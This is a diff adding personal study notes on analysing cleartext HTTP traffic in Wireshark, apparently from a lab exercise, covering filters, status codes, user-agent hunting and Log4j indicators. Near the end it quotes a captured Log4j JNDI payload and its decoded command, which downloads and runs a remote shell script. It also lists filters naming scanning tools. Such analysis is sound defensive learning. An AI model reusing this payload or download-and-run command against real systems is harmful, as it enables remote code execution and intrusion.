@@ -190,3 +190,165 @@ Use secure alternatives:
 - SFTP
 - FTPS
 - SCP
+
+# Cleartext Protocol Analysis: HTTP
+
+## 🔍 Why HTTP Analysis Matters
+
+HTTP traffic analysis can help detect:
+
+- Phishing pages
+- Web attacks
+- Data exfiltration
+- Command and Control (C2) traffic
+
+---
+
+## 🌐 Basic Wireshark Filters
+
+### Global Search
+http
+http2
+
+> Note: HTTP/2 is a newer version of HTTP that improves performance and uses binary framing, but the core request/response idea remains the same.
+
+---
+
+## 📨 HTTP Request Methods
+
+Common methods that are useful in analysis:
+
+- `GET` → retrieve data
+- `POST` → submit data
+
+### Filters
+http.request.method == "GET"
+http.request.method == "POST"
+http.request
+
+### Key Insight
+- `GET` requests are useful for tracking page/resource access
+- `POST` requests are important because they may contain submitted data, credentials, or malicious payloads
+
+---
+
+## 📥 HTTP Response Status Codes
+
+Useful status codes to review during traffic analysis:
+
+- `200` → OK
+- `301` → Moved Permanently
+- `302` → Moved Temporarily
+- `400` → Bad Request
+- `401` → Unauthorized
+- `403` → Forbidden
+- `404` → Not Found
+- `405` → Method Not Allowed
+- `408` → Request Timeout
+- `500` → Internal Server Error
+- `503` → Service Unavailable
+
+### Filters
+http.response.code == 200
+
+
+### Key Insight
+Response codes can quickly reveal:
+- successful communication
+- access failures
+- missing resources
+- possible misconfigurations or attack attempts
+
+---
+
+## 🧩 Useful HTTP Parameters
+
+### Filters
+http.user_agent contains "keyword"
+http.request.uri contains "admin"
+http.request.full_uri contains "admin"
+http.server contains "apache"
+http.host contains "keyword"
+http.host == "keyword"
+http.connection == "Keep-Alive"
+data-text-lines contains "keyword"
+
+### Key Insight
+Important HTTP fields include:
+- **User-Agent** → identifies browser/tool information
+- **Request URI / Full URI** → shows requested resource
+- **Server** → may reveal web server software
+- **Host** → shows target hostname
+- **Connection** → indicates session behavior
+- **Cleartext data** → may expose sensitive information in requests/responses
+
+---
+
+## 🕵️ User-Agent Analysis
+
+The `User-Agent` field is useful for spotting suspicious or unusual HTTP activity.
+
+### Global Filter
+http.user_agent
+
+### Things to Look For
+- Different user-agent strings from the same host in a short time
+- Non-standard or custom user agents
+- Small spelling differences in known user agents
+- Security tool names in the header
+- Payload-like data in the user-agent field
+
+### Example Filter
+(http.user_agent contains "sqlmap") or (http.user_agent contains "Nmap") or (http.user_agent contains "Wfuzz") or (http.user_agent contains "Nikto")
+
+### Key Insight
+User-Agent analysis is helpful, but it should not be trusted alone. Attackers can modify user-agent values to appear normal.
+
+---
+
+## ⚠️ Example Threat Hunting Use Case: Log4j
+
+A practical HTTP investigation can include looking for suspicious cleartext patterns related to known attacks.
+
+### Indicators Mentioned in This Exercise
+- Attack may begin with a `POST` request
+- Known suspicious patterns may include:
+  - `jndi`
+  - `Exploit`
+
+### Example Filters
+http.request.method == "POST"
+(ip contains "jndi") or (ip contains "Exploit")
+(frame contains "jndi") or (frame contains "Exploit")
+(http.user_agent contains "$") or (http.user_agent contains "==")
+
+### Key Insight
+Cleartext HTTP analysis can sometimes expose malicious payload delivery or exploitation attempts directly in packet contents.
+
+---
+
+## 🛠️ Tool Used
+- Wireshark
+
+---
+
+## 💡 What I Learned
+- HTTP is one of the most valuable cleartext protocols in traffic analysis
+- Request methods and response codes provide quick investigation clues
+- User-Agent fields can help reveal anomalies or attacker tools
+- Cleartext protocols may expose sensitive or malicious content directly
+- HTTP filtering is useful for both troubleshooting and threat hunting
+
+---
+
+## ⚠️ Note
+This writeup focuses on protocol understanding and methodology only.  
+Specific challenge answers, flags, and target-specific solutions are intentionally excluded.
+## Q: Locate the "Log4j" attack starting phase and decode the base64 command. What is the IP address contacted by the adversary? (Enter the address in defanged format and exclude "{}".)
+
+User-Agent: ${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}
+  --> message: d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==
+  --> decode using base64 => wget http://62.210.130.250/lh.sh;chmod +x lh.sh;./lh.sh
+  --> download lh.sh file from remote ip 62.210.130.250 and give execute premission to the file and immediately run it
+
+---
